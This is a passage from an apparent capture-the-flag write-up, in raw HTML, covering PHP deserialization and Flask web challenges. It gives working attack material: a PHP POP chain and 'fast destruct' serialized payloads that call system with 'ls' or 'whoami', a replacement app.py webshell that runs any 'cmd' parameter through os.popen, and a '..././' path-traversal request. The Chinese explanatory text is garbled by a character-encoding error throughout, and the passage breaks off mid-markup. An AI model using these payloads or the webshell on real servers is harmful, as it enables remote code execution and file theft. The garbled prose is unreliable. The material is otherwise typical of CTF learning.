class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//ä»invokeæ–¹æ³•è·³åˆ°è¿™é‡Œ</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123; <br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//system(&#x27;cat /fl*&#x27;)</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//ç±»è¢«å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œä»destructè·³åˆ°è¿™</span><br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br>Fatal error: Uncaught <span class="hljs-built_in">Exception</span>: Nope in /<span class="hljs-keyword">var</span>/www/html/index.php:<span class="hljs-number">55</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸<code>pop</code>é“¾æ„é€ çš„é¢˜ä¸è¿‡åº•ä¸‹åŠ äº†ä¸ª<code>throw new Exception(&quot;Nope&quot;);</code>ã€‚æœ€å¼€å§‹æ²¡æ³¨æ„è¿™ä¸ªä¸œè¥¿ç›´æ¥å†™äº†é“¾å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__destructå¼€å¤´ï¼Œ__toStringï¼Œ__getï¼Œ__invokeï¼Œevil</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;ls&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><span class="hljs-variable">$a</span> -&gt; errMsg = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt; obj = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; func = <span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>åé¢æ‰çŸ¥é“è€ƒç‚¹æ˜¯<code>fast destruct</code>ï¼Œä¸‹é¢çš„å†…å®¹å‚è€ƒäº†ï¼š<code>https://eastjun.top/posts/php_unserialize_tricks/</code></p><p>é€šå¸¸ååºåˆ—åŒ–çš„å…¥å£éƒ½æ˜¯<code>__destruct()</code>æ–¹æ³•ï¼Œ&#96;&#96;__wakeup()<code>æ–¹æ³•çš„å†…å®¹ä¸€èˆ¬ä¸ºååºåˆ—åŒ–è®¾ç½®äº†æŸäº›é™åˆ¶ï¼Œéœ€è¦æˆ‘ä»¬ç»•è¿‡ã€‚**å¦‚æœåœ¨ååºåˆ—åŒ–æ“ä½œä¹‹åæŠ›å‡ºäº†å¼‚å¸¸åˆ™ä¼šè·³è¿‡</code>__destruct()<code>å‡½æ•°çš„æ‰§è¡Œã€‚å¯ä»¥ç†è§£ä¸º</code>throw<code>è¿™ä¸ªå‡½æ•°å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´</code>destruct<code>æ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä¹Ÿå°±æ²¡æ³•è§¦å‘</code>destruct&#96;å‡½æ•°**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å€Ÿç”¨è¿™ä½å¸ˆå‚…æ–‡ç« ä¸­çš„ä¸€ä¸ªæ —å­ï¼š</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Clazz</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br><br></code></pre></td></tr></table></figure><p><img src="/img/fastdes1.png" alt="fastdes1"></p><p><code>POST</code>ä¼ <code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code>ä¸ä¼šå¾—åˆ°ä»»ä½•ç»“æœã€‚</p><p>å› ä¸ºååºåˆ—åŒ–æ“ä½œæ‰§è¡Œåæ²¡æœ‰ç«‹åˆ»æ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ï¼Œè€Œæ˜¯æŠ›å‡ºäº†å¼‚å¸¸å¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«è·³è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä¿®æ”¹åºåˆ—åŒ–å¾—åˆ°çš„å­—ç¬¦ä¸²ä½¿å¾—ååºåˆ—åŒ–è§£æå‡ºé”™ï¼Œå¯¼è‡´<code>__destruct()</code>æ–¹æ³•è¢«æå‰æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœæ˜¯ï¼š<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>å¯ä»¥ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//æœ«å°¾åŠ å…¥æ•°å­—1</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//å»æ‰ç»“å°¾çš„å¤§æ‹¬å·</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<br></code></pre></td></tr></table></figure><p><code>unserialize()</code>å‡½æ•°åœ¨æ‰«æåˆ°åºåˆ—åŒ–å­—ç¬¦ä¸²æ ¼å¼æœ‰è¯¯æ—¶ä¼šæå–è§¦å‘å¯¹è±¡çš„<code>__destruct()</code>æ–¹æ³•å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p><p><code>data=O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;1&#125;</code></p><p><img src="/img/fastdes3.png" alt="fastdes3"></p><p>åé¢çœ‹äº†å…¶å®ƒå¸ˆå‚…çš„<code>wp</code>å‘ç°è¿˜æœ‰å…¶å®ƒè§£æ³•ï¼š</p><p><code>https://blog.csdn.net/m0_73512445/article/details/133694293</code></p><p><code>https://blog.csdn.net/Myon5/article/details/134018456</code></p><p><strong>GCå›æ”¶æœºåˆ¶æå‰è§¦å‘__destruct()</strong></p><p>åœ¨PHPä¸­ï¼Œä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸæ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡çš„ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLï¼Œæˆ–è€…æ²¡æœ‰ä»»ä½•æŒ‡é’ˆæŒ‡å‘æ—¶ï¼Œå®ƒå°±ä¼šè¢«å˜æˆåƒåœ¾ï¼Œè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ã€‚åœ¨å›æ”¶çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šè‡ªåŠ¨è§¦å‘_destructæ–¹æ³•ã€‚<br>å¯ä»¥ä»¤<code>$v = array($a,NULL)</code>ç„¶å<code>echo serialize($v)</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">1</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæŠŠ<code>i:1;N;</code>çš„<code>1</code>æ”¹æˆ<code>0</code>:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Start&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;errMsg&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Crypto&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Reverse&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Pwn&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;obj&quot;</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Web&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;var&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;&#125;&#125;&#125;&#125;&#125;i:<span class="hljs-number">0</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>è‡³äºä¸ºå•¥ä¿®æ”¹æˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šã€‚ã€‚</p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p><img src="/img/flaskdisk1.png" alt="flaskdisk1"></p><p>ä¸‰ä¸ªè·¯ç”±ï¼š<code>list</code>ï¼Œ<code>upload</code>ï¼Œ<code>console</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/list<br>app.py 1746b 2023-10-14 11:16:00<br>/upload<br>ä¸Šä¼ æ–‡ä»¶<br>/console<br>è¾“å…¥PINç <br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä»¥ä¸ºè¦å»ç”Ÿæˆ<code>PIN</code>ç ç„¶åè¿›æ§åˆ¶å°ã€‚ã€‚ä½†æ£é¼“åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°èƒ½è¯»æˆ‘éœ€è¦çš„æ•°æ®çš„åœ°æ–¹ã€‚</p><p><code>upload</code>è¿™ä¸ªè·¯ç”±å€’æ˜¯æ²¡å•¥é™åˆ¶ï¼Œä½†æˆ‘ä¸Šä¼ å®Œä¸œè¥¿ä¸çŸ¥é“ä¸Šä¼ è·¯å¾„æ˜¯å•¥ã€‚</p><p>åé¢çœ‹äº†ä¸‹<code>wp</code>(å‚è€ƒï¼š<code>https://blog.csdn.net/m0_73512445/article/details/133694293</code>):</p><p>å› ä¸ºè®¿é—®<code>console</code>è¿™ä¸ªè·¯ç”±ä¼šæç¤ºè¦è¾“å…¥<code>PIN</code>ç (è¯´æ˜<code>flask</code>å¼€å¯äº†<code>debug</code>æ¨¡å¼ã€‚<code>flask</code>å¼€å¯äº†<code>debug</code>æ¨¡å¼ä¸‹ï¼Œ<code>app.py</code>æºæ–‡ä»¶è¢«ä¿®æ”¹åä¼šç«‹åˆ»åŠ è½½ã€‚æ‰€ä»¥åªéœ€è¦ä¸Šä¼ ä¸€ä¸ªèƒ½<code>rce</code>çš„<code>app.py</code>æ–‡ä»¶æŠŠåŸæ¥çš„è¦†ç›–ï¼Œå°±å¯ä»¥äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> os<br>app = Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <br>    <span class="hljs-keyword">try</span>:        <br>        cmd = request.args.get(<span class="hljs-string">&#x27;cmd&#x27;</span>)        <br>        data = os.popen(cmd).read()        <br>        <span class="hljs-keyword">return</span> data    <br>    <span class="hljs-keyword">except</span>:        <br>        <span class="hljs-keyword">pass</span>    <br>        <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:    <br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">5000</span>,debug=<span class="hljs-literal">True</span>) <span class="hljs-comment">#é¢˜ç›®æç¤ºäº†è¿è¡Œåœ¨5000ç«¯å£</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/flaskdisk2.png" alt="flaskdisk2"></p><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">//Dockerfile<br><span class="hljs-keyword">FROM</span> vulhub/flask:<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><br><span class="hljs-keyword">ENV</span> FLAG=flag&#123;not_here&#125;<br><span class="hljs-keyword">COPY</span><span class="language-bash"> src/ /app</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mv</span> /app/start.sh /start.sh &amp;&amp; <span class="hljs-built_in">chmod</span> 777 /start.sh</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [ <span class="hljs-string">&quot;/start.sh&quot;</span> ]</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p><img src="/img/injectme1.png" alt="injectme1"></p><p><code>/app</code>ç›®å½•æ³„éœ²ï¼Œé‡Œé¢æœ‰åŸæœ¬åœ¨<code>src</code>ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p><p><img src="/img/injectme2.png" alt="injectme2"></p><p>æ³¨æ„<code>URL</code></p><p><img src="/img/injectme3.png" alt="injectme3"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dwonload</span>():<br>filename = request.arg.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#ä»è¯·æ±‚çš„å‚æ•°ä¸­è·å–åä¸º &#x27;file&#x27; çš„å€¼ï¼Œå¦‚æœæ²¡æœ‰æä¾›åˆ™é»˜è®¤ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</span><br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#../è¢«æ›¿æ¢æˆç©ºï¼Œå¯ä»¥è€ƒè™‘..././ç»•è¿‡</span><br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename) <span class="hljs-comment">#å°†ç»è¿‡å¤„ç†çš„æ–‡ä»¶åä¸ &#x27;static/img/&#x27; ç›®å½•æ‹¼æ¥èµ·æ¥ï¼Œç”Ÿæˆæœ€ç»ˆçš„æ–‡ä»¶è·¯å¾„</span><br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<span class="hljs-comment">#æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œå¹¶ä¸”æ–‡ä»¶è·¯å¾„ä¸­ä¸åŒ…å« &quot;start&quot; å­—ç¬¦ä¸²</span><br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ©ç”¨ç›®å½•ç©¿è¶Šå»æ‰¾<code>app,py</code>:</p><p><code>cancanneed?file=..././..././..././app/app.py</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 